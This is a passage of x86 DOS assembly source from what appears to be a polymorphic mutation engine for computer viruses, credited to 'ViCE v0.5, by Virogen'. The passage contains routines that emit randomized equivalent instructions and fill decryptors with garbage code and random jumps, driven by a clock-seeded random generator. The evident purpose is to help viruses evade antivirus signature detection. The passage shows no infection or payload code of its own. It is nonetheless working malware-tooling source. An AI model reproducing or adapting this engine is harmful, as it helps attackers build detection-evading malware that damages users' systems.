;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
byte_add_sub:
            mov     dl,83h
            mov     word ptr [di],dx
            inc     di
            inc     di
            mov     byte ptr [di],ah
            inc     di
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Generate Code To Decrement A Register
; al=register
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dec_register:
            push    dx ax
            mov     ax,5
            call    random                  ; grab random byte
            pop     ax
            mov     ah,0
            mov     si,ax
            cmp     dl,1                    ; use byte SUB reg,1?
            jz      use_sub_1
            cmp     dl,2                    ; use byte ADD reg,-1?
            jz      use_nadd_1
            cmp     dl,3                    ; use word SUB reg,1?
            jz      use_word_sub_1
            cmp     dl,4                    ; use word SUB reg,-1?
            jz      use_word_add_n1
            mov     dl, dec_struct[bp+si]   ; default to DEC reg
            mov     byte ptr [di],dl        ; write opereand
            inc     di
            jmp     dec_done
use_sub_1:
            mov     dh, byte_sub_struct[bp+si] ; get operand
            mov     ah,1                    ; value is 1
            call    byte_add_sub            ; write operand
            jmp     dec_done
use_nadd_1:
            mov     dh, byte_add_struct[bp+si] ; get operand
            mov     ah,0FFh                 ; value is -1
            call    byte_add_sub            ; write operand
            jmp     dec_done
use_word_sub_1:
            mov     cx,-1                   ; value is 1 (is inversed)
            call    sub_reg_val             ; write subtract operand
            jmp     dec_done
use_word_add_n1:
            mov     cx,0FFFFh               ; value is -1
            call    add_reg_val             ; write add operand
dec_done:
            pop     dx
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Generate Code To Move XXXX Into Register
; cx=value
; al=register
; bl=1-half, 0-word
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

mov_register:
            push    ax bx
            call    random_byte             ; grab a random byte
            pop     bx ax
            mov     ah,0
            mov     si,ax
            cmp     bl,1                    ; half or word register?
            jz      use_half
            test    dl,00010000b            ; use add or sub?
            jz      use_add_sub             ; default to MOV reg,XXXX
            mov     al,mov_struct[bp+si]    ; get mov op
            mov     byte ptr [di],al        ; write op
            inc     di
            mov     word ptr [di],cx        ; write value
            inc     di
            jmp     wrote_mov
use_half:
            mov     al,mov_h_struct[bp+si]
            mov     byte ptr [di],al
            inc     di
            mov     byte ptr [di],cl
wrote_mov:
            inc     di
            jmp     use_mov
use_add_sub:
            call    zero_register           ; generate zero register construct
            cmp     al,_dx                  ; pointer register?
            jg      use_add
            test    dl,00100000b            ; use SUB?
            jz      use_sub
use_add:
            call    add_reg_val
            jmp     use_mov
use_sub:
            call    sub_reg_val
use_mov:
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Write word ADD Register
;  AL=register
;  CX=value
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
add_reg_val:
            mov     ah,0
            mov     si,ax
            mov     ah, add_struct[bp+si]   ; get ADD op
            cmp     al,_ax                  ; AX register?
            jz      ax_add_op               ; if so write shorter op
            mov     byte ptr [di],81h       ; write op
            inc     di
ax_add_op:
            mov     byte ptr [di],ah
            inc     di
            mov     word ptr [di],cx        ; write value
            inc     di
            inc     di
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Write word SUB Register
;  AL=register
;  CX=value
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

sub_reg_val:
            mov     ah,0
            mov     si,ax
            mov     ah, sub_struct[bp+si]   ; get SUB op
            cmp     al,_ax                  ; if ax
            jz      ax_sub_op               ; then use shorter op
            mov     byte ptr [di],81h       ; write op
            inc     di
ax_sub_op:
            mov     byte ptr [di],ah
            inc     di
            mov     ax,0FFFFh               ; calculate value
            sub     ax,cx
            inc     ax
            mov     word ptr [di],ax        ; write value [0FFFFh-(org value-1)]
            inc     di
            inc     di
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Get sec/ms from clock
; ret: CX,DX time
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

get_timer:
            push    ax
            mov     ah,2ch                  ; get clock
            int     21h
            mov     ran_seed[bp],dx
            pop     ax
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Init Random Seed
; writes seconds/ms from clock to seed
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

random_init:
            push    cx
            mov     ah,2ch                  ; get clock
            int     21h
            mov     ran_seed[bp],dx
            pop     cx
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Build random ptr
;  ax=max
;  ret:si=ptr
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ran_ptr:
            push    cx
            call    random
            pop     cx
            mov     si,dx
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  Get Random Number
;  AX=max number
;  ret: DX=random #
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

random_byte:
            mov     ax,0FFh
random:
            inc     ax
            push    cx ax
            mov     ax, ran_seed[bp]
            mov     cx,31413
            mul     cx
            add     ax,13849
            mov     ran_seed[bp],ax
            pop     cx
            mul     cx
            pop     cx
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  Garbage Code Filler
;  entry: CX=max bytes
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
fill_buffer:
            or      cx,cx                   ; if 0, then can't generate garbage
            jnz     isn_0
            ret
isn_0:
            mov     busy[bp],1              ; don't get into nests
fill_loop:
            mov     ax,6                    ; 7 possible garbage functions
            call    random
            mov     al,dl                   ; al=function

            cmp     cx,1                    ; only 1 byte left?
            jz      m_one_byte              ; if so then make a one byte operand
            cmp     cx,8                    ; <8 bytes left?
            jl      no_mov_reg              ; then don't use JMP or MOV garbage
            or      al,al                   ; function 0 (JMP)?
            jnz     no_make_jmp             ; nope..
            call    make_jmp                ; make a jmp
            jmp     g_done                  ; done..
no_make_jmp:
            cmp     al,1                    ; function 1 (MOV_register)?
            jnz     no_mov_reg              ; if not then check next
            push    cx
            call    get_reg                 ; get register to mov to
            push    ax
            call    random_byte             ; get random value
            mov     cx,dx
            pop     ax
            push    di
            mov     bl,0                    ; use word register
            call    mov_register            ; generate code to mov register
            pop     ax
            mov     bx,di
            sub     bx,ax                   ; calculate mov operand code size
            pop     cx
            sub     cx,bx                   ; subtract garbage left
            jmp     g_done                  ; done..
no_mov_reg:
            cmp     al,2                    ; function 2 (one byte)?
            jnz     no_one_byte
m_one_byte:
            mov     ax,(offset nops_1_e-offset nops_1)-1
            call    ran_ptr                 ; get random ptr to a one byte operand
            mov     ah,byte ptr [nops_1+si+bp] ; load operand
            mov     [di],ah                 ; write operand
            inc     di
            dec     cx
            jmp     g_done
no_one_byte:
            cmp     cx,2                    ; <2 bytes?
            jl      no_two_byte             ; if so then can't make CMP or TEST
            cmp     al,3                    ; if al=3 then make CMP
            jz      make_cmp
            cmp     al,4                    ; if al=4 then make TEST
            jnz     no_two_byte
make_test:
            mov     byte ptr [di],85h       ; write TEST
            jmp     det_2_op
make_cmp:
            mov     byte ptr [di],39h       ; write CMP
det_2_op:
            inc     di
            mov     ax,0FFh-0C0h            ; operand range
            call    random                  ; get random regs to use
            add     dl,0C0h                 ; adjust
            lea     bx,zero_struct-1[bp]
chk_bad_test_cmp:
            inc     bx
            cmp     byte ptr [bx],dl
            jz      fix_test_cmp            ; looping for another takes too
            cmp     byte ptr [bx],0         ; much processor time
            jz      done_chk_bad
            jmp     chk_bad_test_cmp
fix_test_cmp:
            cmp     dl,0FFh
            jz      dec_dl
            cmp     dl,0C0h
            jz      inc_dl
dec_dl:
            dec     dl
            jmp     done_chk_bad
inc_dl:
            inc     dl
done_chk_bad:
            mov     byte ptr [di],dl        ; write low byte of operand
            inc     di
            dec     cx
            dec     cx
            jmp     g_done
no_two_byte:
            cmp     cx,3                    ; <3 bytes?
            jl      no_sub_reg              ; if so, can't make ADD/SUB
            cmp     al,5                    ; if al=5 then make ADD
            jnz     no_add_reg
            push    cx
            mov     ax,0FFFEh
            call    random                  ; get random value
            mov     cx,dx
            call    get_reg                 ; get register
            call    add_reg_val             ; write add operand
            pop     cx
            sub     cx,3
            jmp     g_done
no_add_reg:
            push    cx
            mov     ax,0FFFEh
            call    random                  ; get random value
            mov     cx,dx
            call    get_reg                 ; get register
            call    sub_reg_val             ; write SUB operand
            pop     cx
            sub     cx,3
no_sub_reg:

g_done:
            or      cx,cx                   ; no more garbage bytes to fill?
            jz      fill_done               ; if so, we're done
            jmp     fill_loop               ; else loop
fill_done:
            mov     busy[bp],0              ; clear busy flag

_fret:      ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Make a JMP in garbage
;  CX=max
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

make_jmp:
            mov     ax,cx
            cmp     ax,max_jmp              ; jump too far?
            jb      num_ok
            mov     ax,max_jmp              ; set to max
num_ok:
            dec     ax
            dec     ax
            push    cx
            call    random                  ; get random jmp location with garbage code
            push    dx
            mov     cx,dx
            mov     al,0EBh                 ; jmp
            mov     ah,cl
            mov     word ptr [di],ax        ; write jmp op
            inc     di
            inc     di
            call    fill_shit               ; fill between jmp->jmp offset with shit
            pop     dx cx
            sub     cx,dx                   ; get new amount of garbage left to write
            dec     cx
            dec     cx
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Fill with random bytes
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

fill_shit:
            or      cx,cx
            jz      fs_ret
            call    random_byte             ; get random byte
            mov     byte ptr [di],dl        ; write it
            inc     di
            loop    fill_shit
fs_ret:     ret


;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  Fill Bytes with Garbage
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

fill_between:
            cmp     busy[bp],1
            jz      goff
            test    options[bp],00000010b   ; garbage on?
            jz      goff
            push    ax cx dx si
            mov     ax, garbage_left[bp]    ; we have a garbage limit..
            cmp     ax, GRB_BEFORE
            jnz     no_force
            mov     cx, max_per_call[bp]
            jmp     forced
no_force:
            or      ax,ax
            jz      not_room
            cmp     ax, max_per_call[bp]    ; and a max limit per call..
            jbe     in_range
            mov     ax, max_per_call[bp]
in_range:
            call    random                  ; get random # of garbage bytes
            xchg    dx,cx
            or      cx,cx
            jz      not_room
forced:
            sub     garbage_left[bp],cx     ; update garbage limit
            call    fill_buffer             ; fill garbage
not_room:
            pop     si dx cx ax
goff:       ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  One-byte Garbage Operands
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
nops_1:     nop
            int     3
            into
            stc
            cld
            stc
            cmc
            clc
            cli
            sti
nops_1_e:
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Operand Structures
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
lp_struct   db      05h,25h,1Dh,3Dh,0Dh,2Dh,15h,35h
lp_bp_struct db     46h,66h,5Eh,7Eh,4Eh,6Eh,56h,76h
push_struct db      50h,53h,51h,52h
mov_struct  db      0B8h,0BBh,0B9h,0BAh,0BFh,0BEh,0BDh
mov_h_struct db     0B0h,0B4h,0B3h,0B7h,0B1h,0B5h,0B2h,0B6h
add_struct  db      5,0C3h,0C1h,0C2h,0C7h,0C6h,0C5h
byte_add_struct db  0C0h,0C3h,0C1h,0C2h,0C7h,0C6h,0C5h
sub_struct  db      2Dh,0EBh,0E9h,0EAh,0EFh,0EEh,0EDh
byte_sub_struct db  0E8h,0EBh,0E9h,0EAh,0EFh,0EEh,0EDh
dec_struct  db      48h,4Bh,49h,4Ah
xor_p_struct db     0,0,0,0,35h,34h,076h
add_p_struct db     0,0,0,0,05h,04h,46h
sub_p_struct db     0,0,0,0,2Dh,2Ch,6Eh
inc_p_struct db     0,0,0,0,47h,46h,45h
xor_h_struct db     0F0h,0F4h,0F3h,0F7h,0F1h,0F5h,0F2h,0F6h
sub_h_struct db     0E8h,0ECh,0EBh,0EFh,0E9h,0EDh,0EAh,0EEh
add_h_struct db     0C0h,0C4h,0C3h,0C7h,0C1h,0C5h,0C2h,0C6h
xor_ptr_reg_struct db 04h,24h,1Ch,3Ch,0Ch,2Ch,14h,34h
zero_struct db      0C0h,0DBh,0C9h,0D2h,0FFh,0F6h,0EDh,0E4h,0

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Variables
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
garbage_left dw     0
max_per_call dw     0
busy        db      0
options     db      0
run_ofs     dw      0
beg_ofs     dw      0
jz_ofs      dw      0
ran_seed    dw      0
dec_reg     db      0
ptr_reg     db      0
push_reg    db      0
load_reg    db      0
d_reg       db      0
inc_op      db      0
add_1_op    dw      0
add_op      db      0
sub_op      db      0
xor_op      db      0
loop_ofs    dw      0
ptr_ofs     dw      0
_ss         dw      0
_sp         dw      0
credits     db      '[ûiCE v0.5, by ûirogen]'
            db      50 dup (0)
_stack:

_vice       endp

cseg        ends
            end
